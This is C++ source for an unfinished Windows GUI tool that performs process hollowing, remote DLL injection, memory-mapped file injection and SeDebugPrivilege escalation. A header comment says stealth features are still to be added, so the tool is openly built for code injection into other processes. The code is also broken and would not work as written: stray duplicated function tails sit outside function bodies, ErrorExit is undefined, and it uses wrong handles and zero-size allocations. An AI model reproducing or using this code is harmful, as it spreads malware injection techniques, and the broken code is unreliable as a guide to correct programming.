// NOT ANYWHERE NEAR COMPLETE AS I STILL NEED TO ADD STEALTH FEATURES, AND A FEW OTHER THINGS!

#include <windows.h>
#include <iostream>
#include <string>
#include <commctrl.h>

HWND hwndPID, hwndDLLPath, hwndFilePath, hwndLogText;
HWND hwndProcessButton, hwndDLLButton, hwndFileButton, hwndEscalateButton;

void LogToGUI(const char* message) {
    SetWindowText(hwndLogText, message);
}

// Function to handle the process hollowing
BOOL HollowProcess(DWORD dwProcessID) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_SUSPEND_RESUME, FALSE, dwProcessID);
    if (!hProcess) {
        ErrorExit("Failed to open target process for hollowing.");
    }

    // Suspend the target process to prevent execution while we hollow it
    if (SuspendThread(hProcess) == -1) {
        ErrorExit("Failed to suspend the target process.");
    }

    // Unmap the target process's memory
    if (!VirtualFreeEx(hProcess, NULL, 0, MEM_RELEASE)) {
        ErrorExit("Failed to unmap process memory.");
    }

    // Proceed with payload injection (DLL injection or EXE)
    std::cout << "Process hollowed successfully!" << std::endl;

    CloseHandle(hProcess);
    return TRUE;
}


    LogToGUI("Process hollowed successfully!");
    return TRUE;
}

// Function for manual DLL injection
BOOL ManualDLLInjection(DWORD dwProcessID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessID);
    if (!hProcess) {
        ErrorExit("Failed to open process for manual DLL injection.");
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        ErrorExit("Failed to allocate memory for DLL path.");
    }

    // Write the DLL path into the allocated memory of the target process
    if (!WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath) + 1, NULL)) {
        ErrorExit("Failed to write DLL path into target process memory.");
    }

    // Get the address of LoadLibraryA (function to load DLL into process)
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        ErrorExit("Failed to find LoadLibraryA.");
    }

    // Create a remote thread in the target process to execute the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
    if (!hThread) {
        ErrorExit("Failed to create remote thread for DLL injection.");
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Manual DLL Injection completed successfully!" << std::endl;
    return TRUE;
}


    LogToGUI("Manual DLL Injection completed successfully!");
    return TRUE;
}

// Function to inject a memory-mapped file
BOOL InjectMemoryMappedFile(DWORD dwProcessID, const char* filePath) {
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessID);
    if (!hProcess) {
        ErrorExit("Failed to open process for memory-mapped file injection.");
    }

    // Open the file to be injected
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ErrorExit("Failed to open the file to be injected.");
    }

    // Create a file mapping for the target process
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        ErrorExit("Failed to create file mapping.");
    }

    // Map the file into memory
    LPVOID pMappedFile = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMappedFile) {
        ErrorExit("Failed to map the file into memory.");
    }

    // Allocate space in the target process to copy the mapped file's content
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, 0, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        ErrorExit("Failed to allocate memory in target process for mapped file.");
    }

    // Write the file content into the target process's memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, pMappedFile, 0, NULL)) {
        ErrorExit("Failed to inject memory-mapped file into target process.");
    }

    // Cleanup
    UnmapViewOfFile(pMappedFile);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    std::cout << "Memory-mapped file injection completed!" << std::endl;
    return TRUE;
}

    LogToGUI("Memory-mapped file injection completed successfully!");
    return TRUE;
}

// Function to escalate privileges
BOOL EscalatePrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    // Open process token to check for privileges
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        ErrorExit("Failed to open process token for privilege escalation.");
    }

    // Adjust token privileges for SeDebugPrivilege (debugger privileges)
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        ErrorExit("Failed to adjust token privileges.");
    }

    CloseHandle(hToken);
    std::cout << "Privilege escalation successful!" << std::endl;
    return TRUE;
}

    LogToGUI("Privilege escalation successful!");
    return TRUE;
}

// GUI Button handlers
void OnProcessButtonClick(HWND hwnd) {
    DWORD dwProcessID = GetDlgItemInt(hwnd, hwndPID, NULL, FALSE);
    if (!HollowProcess(dwProcessID)) {
        LogToGUI("Error: Process Hollowing Failed.");
    }
}

void OnDLLButtonClick(HWND hwnd) {
    DWORD dwProcessID = GetDlgItemInt(hwnd, hwndPID, NULL, FALSE);
    char dllPath[MAX_PATH];
    GetWindowText(hwndDLLPath, dllPath, MAX_PATH);
    if (!ManualDLLInjection(dwProcessID, dllPath)) {
        LogToGUI("Error: DLL Injection Failed.");
    }
}

void OnFileButtonClick(HWND hwnd) {
    DWORD dwProcessID = GetDlgItemInt(hwnd, hwndPID, NULL, FALSE);
    char filePath[MAX_PATH];
    GetWindowText(hwndFilePath, filePath, MAX_PATH);
    if (!InjectMemoryMappedFile(dwProcessID, filePath)) {
        LogToGUI("Error: File Injection Failed.");
    }
}

void OnEscalateButtonClick(HWND hwnd) {
    if (!EscalatePrivileges()) {
        LogToGUI("Error: Privilege Escalation Failed.");
    }
}

// Window procedure to process messages
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) OnProcessButtonClick(hwnd);  
        if (LOWORD(wParam) == 2) OnDLLButtonClick(hwnd);      
        if (LOWORD(wParam) == 3) OnFileButtonClick(hwnd);     
        if (LOWORD(wParam) == 4) OnEscalateButtonClick(hwnd); 
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

// Main function to set up the GUI
int main() {
    // Initialize COM library for Common Controls
    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icc.dwICC = ICC_WIN95_CLASSES;
    InitCommonControlsEx(&icc);

    // Register the window class
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "HollowingTool";
    RegisterClass(&wc);

    // Create the window
    HWND hwnd = CreateWindowEx(0, "HollowingTool", "Hollowing & Injection Tool", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 400, NULL, NULL, wc.hInstance, NULL);

    // Create controls: labels, edit boxes, buttons
    CreateWindow("STATIC", "Enter Process ID:", WS_VISIBLE | WS_CHILD, 10, 10, 100, 20, hwnd, NULL, wc.hInstance, NULL);
    hwndPID = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 120, 10, 250, 20, hwnd, NULL, wc.hInstance, NULL);

    CreateWindow("STATIC", "Enter DLL Path:", WS_VISIBLE | WS_CHILD, 10, 40, 100, 20, hwnd, NULL, wc.hInstance, NULL);
    hwndDLLPath = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 120, 40, 250, 20, hwnd, NULL, wc.hInstance, NULL);

    CreateWindow("STATIC", "Enter File Path:", WS_VISIBLE | WS_CHILD, 10, 70, 100, 20, hwnd, NULL, wc.hInstance, NULL);
    hwndFilePath = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 120, 70, 250, 20, hwnd, NULL, wc.hInstance, NULL);

    hwndProcessButton = CreateWindow("BUTTON", "Process Hollowing", WS_VISIBLE | WS_CHILD, 10, 100, 150, 30, hwnd, (HMENU)1, wc.hInstance, NULL);
    hwndDLLButton = CreateWindow("BUTTON", "DLL Injection", WS_VISIBLE | WS_CHILD, 170, 100, 150, 30, hwnd, (HMENU)2, wc.hInstance, NULL);
    hwndFileButton = CreateWindow("BUTTON", "File Injection", WS_VISIBLE | WS_CHILD, 10, 140, 150, 30, hwnd, (HMENU)3, wc.hInstance, NULL);
    hwndEscalateButton = CreateWindow("BUTTON", "Escalate Privileges", WS_VISIBLE | WS_CHILD, 170, 140, 150, 30, hwnd, (HMENU)4, wc.hInstance, NULL);

    hwndLogText = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 180, 360, 150, hwnd, NULL, wc.hInstance, NULL);

    // Show the window and run the message loop
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
